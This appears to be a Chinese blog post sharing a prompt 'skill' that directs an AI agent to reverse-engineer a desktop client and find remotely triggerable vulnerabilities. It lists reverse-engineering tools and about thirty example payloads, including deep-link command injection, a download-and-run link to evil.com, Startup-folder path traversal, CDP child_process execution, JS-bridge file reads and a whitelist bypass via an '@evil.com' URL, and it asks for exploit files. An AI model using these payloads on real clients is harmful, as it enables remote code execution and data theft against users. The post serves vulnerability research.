#  客户端漏洞挖掘skills v1.1  
原创 鬼麦子
                        鬼麦子  鬼麦子   2026-10-24 03:27  
  
[客户端漏洞挖掘skills](https://mp.weixin.qq.com/s?__biz=Mzg4MzY3MTgyMw==&mid=2247484339&idx=1&sn=d9ef17f00f5a6bb0b64a1db2a007ebd3&scene=21#wechat_redirect)  
  
  
更新下，1024码农节，希望各位再就业成功。  
  
需要一些工具，自己或者让ai安装下呗。  
```
---
name: test_client
description: 客户端漏洞挖掘，我给客户端安装目录，对目标客户端进行漏洞挖掘。
---

# 客户端黑盒漏洞挖掘

深入理解客户端所有功能，但不可修改目标项目的任何文件内容。

目标：只挖**可远程触达**的漏洞——攻击者在自己机器上构造恶意输入(URL、Deep Link/伪协议、聊天消息、网络包、以及对方打开的文件内容如 html/doc/pdf/ppt/xlsx/jpg/png/mp3/mp4...等常见文档图片音乐视频资源文件)，通过网络送达受害者即可触发的。需要攻击者已登录或物理接触受害者主机才能触发的，才算本地缺陷，不作为漏洞交付。


可以使用以下工具：

- PowerShell（主战）
- cmd
- python
- rabin2.exe  工具安装目录 D:\hack_tools\radare2-6.1.6-w64\bin
- asar
- curl.exe
- frida frida-tools 已安装(pip安装版)
- cdb.exe
- procdump.exe 工具安装目录 D:\hack_tools\Procdump\
- ghidra 工具安装目录 D:\hack_tools\ghidra_12.1.4_PUBLIC\

用好工具，逆向、反编译、反汇编、与直接测试都可以用于进行深度漏洞挖掘，如存在攻击面的函数变量深度追踪，危险函数变量的深度追踪，说白了你可以静态逆向和动态调试，你有完整的电脑操作权限，认真挖吧，兄弟，挖到有真实危害、可远程攻击的漏洞。

### 攻击面分析

1. 框架类CEF/Electron/WPF/WinForms/QT/Tauri/WinUI3 
2. 自定义协议 Deep Link/App Link 自定义协议路由
3. 客户端程序开启的侦听端口
4. 客户端进程信息
5. 客户端功能，比如社交类，消息\语音\视频\文件\协议\通信收发，文档类，pdf\doc\md\ppt\xlsx，音乐视频播放类，mp3/mp4/avi... 图片查看类png/jpg/jpge... 具体功能都有具体的攻击面，文件解析什么的。
6. js接口(JS Bridge)
7. 重点关注文件类型： `.exe` `.dll` `.asar` `.config` `.json` `.xml` `.js` `.html` `.pak` 
8. 鉴权功能，客户端如何做鉴权，重点在鉴权参数

**必须通过逆向、反编译、反汇编理解应用程序背后的真实代码和运行逻辑，要完整深入的理解每一个功能。**



### 漏洞案例

1. 功能漏洞，如自定义协议、JS Bridge、发消息接受消息、文件解析、特殊域如file域xss、之类能被造成远程危害的功能型漏洞。
2. 设计缺陷，明明只是正常功能，但却能造成远程危害。
3. 内存破坏类型漏洞，溢出、UAF、Double Free、OOB、整数溢出等能被远程利用的内存型漏洞。
4. myapp://?id=1|calc    伪协议参数命令注入
5. myapp://?url=http://test.com/cve-2022-xxx.html   客户端可以加载指定页面，但客户端内嵌chrome版本太低并且--no-sandbox未开沙箱,导致rce
6. myapp://install?url=http://evil.com/1.exe   直接下载执行远程文件
7. myapp://?url=file://C://Windows//System32//calc.exe    伪协议导致可以打开本地任意文件，导致rce
8. myapp://download?url=http://www.test.com/calc.exe&foldername=.../.../.../.../.../.../Start Menu/Programs/Startup    目录穿越，下载exe至启动目录或者覆盖其他exe文件，导致rce
9. http://127.0.0.1:1239/api/exec?cmd=calc   端口功能，导致rce
10. http://127.0.0.1:1239/api/ping?ip=0.0.0.0|calc  参数命令注入rce
11. http://127.0.0.1:1239/api/go-to?url=http://test.com/cve-2022-xxx.html  客户端可以加载指定页面，但客户端内嵌chrome版本太低并且--no-sandbox未开沙箱,导致rce
12. http://127.0.0.1:1239/../../../Windows/win.ini     目录穿越，任意文件读取
13. http://127.0.0.1:29222/json    cdp端口开放，无Origin效验，导致出现一系列攻击面，如require('child_process').exec('calc')  导致rce等。
14. POST http://127.0.0.1:45621/download
       {"type":"action","url":"http://www.test.com@evil.com/calc.exe"}    客户端端口功能，www.test.com特权域可直接执行下载文件，下载并直接执行exe导致rce，特权域绕过。
15. 侦听端口非本地回环，可被远程连接访问，如某端口开放websockets可被远程连接，通过了解后端功能构造调用目标某进程，构造exp while循环无限调用，导致主进程崩溃或主机资源耗尽，导致远程dos
16. require('child_process').exec('calc')   一些客户端内嵌浏览器可控，访问测试页面后可以执行nodejs代码，导致rce
17. window.test.test({"cmd":"calc"})	一些客户端内嵌浏览器可控，内部定义了很多js接口(JS Bridge)功能，导致rce
18. window.test.test({"openurl":"file://C://Windows//System32//calc.exe"})	一些客户端内嵌浏览器可控，内部定义了很多js接口功能，导致rce
19. window.test.test({"read":"file://C:/Windows/win.ini"})	一些客户端内嵌浏览器可控，内部定义了很多js接口功能，导致任意文件读取
20. window.test.getCookie()	一些客户端内嵌浏览器可控，内部定义了很多js接口(JS Bridge)功能，导致敏感信息泄露
21. http://127.0.0.1:1239/api/get?text=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   远程溢出导致拒绝服务，没有内存保护GS、DEP、ASLR之类，可尝试编写shellcode exp远程rce
22. window.test.test("\x00\x00\x00 ")    溢出导致拒绝服务，没有内存保护GS、DEP、ASLR之类，可尝试编写shellcode exp远程rce
23. 带社交功能客户端，接受文件时，后端解析漏洞，jpg/png/pdf/html/doc，解析溢出、xxe、拒绝服务、接受某种格式文件造成客户端xss
24. 社交聊天发构造图片/视频/富文本/评论资料页xss payload → 接收端或浏览者触发特权域/file域XSS、拒绝服务
25. 构造畸形PNG/HEVC/MP4发到聊天 → 接收端解码崩溃，无需交互的远程DoS
26. 内置Chrome浏览器支持file跨域运行、读取、删除本地文件
27. 社交功能作为重点测试功能，因为可控点多，还可以远程，比如某社交功能，图片解析时溢出rce、dos
28. 社交功能发送个exe/bat之类可执行文件，对方在聊天界面点击一下接收的exe，就执行了
29. 社交功能视频通话时接收端存在堆溢出，导致rce
30. 社交功能发送url，因url匹配客户端后端某白名单，如www.xxx.com是白名单，但是可以通过www.xxx.com@evil.com绕过，并且客户端解析预览了该url，并把鉴权参数带在http header里发送给构造bypass白名单的url
31. 浏览器功能file域可用，浏览指定本地file域html(这玩意就是缺少个本地html路径，准确来说是用户名，因为浏览器下载html 默认download目录，差个用户名，但用户名是可以猜测，有用户名是高危，没有用户名是中危)，尝试file://C:/Windows/win.ini本地文件读取。


**反正要的是能远程触发的漏洞rce\dos\任意文件读写，或者根据目标客户端特性，某播放器打开mp3/mp4、某文档工具打开doc/pdf/ppt/xlsx、某浏览器打开url/html/jpg/xml、某投屏工具端口功能溢出，就rce的漏洞，具体你看着办吧。**



### 漏洞验证

虚假漏洞案例: myapp://page/webview?url=file://C://Windows//System32//calc.exe     如从某些点看起来，这样就可以执行，实际上url参数在某些地方已经没安全过滤了，所以是虚假漏洞;  伪协议的虚假漏洞：仅靠本机 Win+R 手动输入 myapp://... 才能触发的，没有外部投递路径(浏览器跳转、聊天消息里的链接、文档内链、其他应用拉起)的，是虚假漏洞;window.test.test({"openurl":"file://C://Windows//System32//calc.exe"})	 这种是必须某些域名下才能执行，如果不能绕过，或者有特权域的xss，也是虚假漏洞。

所以发现漏洞后，二次验证，必须是可靠漏洞，跟踪整个链路，通过逆向反编译，代码层面验证过或者实际验证过的真实漏洞，可以进行远程攻击的漏洞，不要有恶意exp之类验证，打开计算器、curl 127.0.0.1/xxx收到log、读到hosts文件即可。


### 项目缓存

可在当前目录建立个文件夹存放md文件，保存攻击面、挖掘过程等重要信息，避免超出上下文后，记忆压缩后，对重要信息的遗忘，以及重复测试。


### 漏洞报告格式标准

1. 客户端攻击面、触发方式、类型、攻击面描述、可能导致出现的漏洞 
| # | 攻击面 | 触发方式 | 框架/类型 | 可能漏洞 |
|---|---|---|---|---|

2. 按照CVSS标准，客户端路径、exp、触发方式、漏洞等级、漏洞类型、漏洞描述。(必须是可靠漏洞，通过逆向、反汇编、反编译，代码层面验证过或者实际验证过的真实漏洞，可以进行远程攻击的漏洞)
| # | 文件路径 | exp | 触发方式 | 等级 | 类型 | 漏洞描述 |验证证据(函数/行号/回显) |
|---|---|---|---|---|---|---|---|

3. exp附件:

    需要本地浏览器触发exp.html exp.js  解析触发: exp.png exp.jpg exp.doc exp.ppt exp.xlsx exp.pdf等 远程触发: exp.py

```  
  
工具url:  
- https://github.com/radareorg/radare2  
  
- https://github.com/frida/frida  
  
- https://github.com/nationalsecurityagency/ghidra  
  
- https://learn.microsoft.com/en-us/sysinternals/downloads/procdump  
  
- https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools  
  
- npm install -g asar  
  
```

```  
```

```  
  
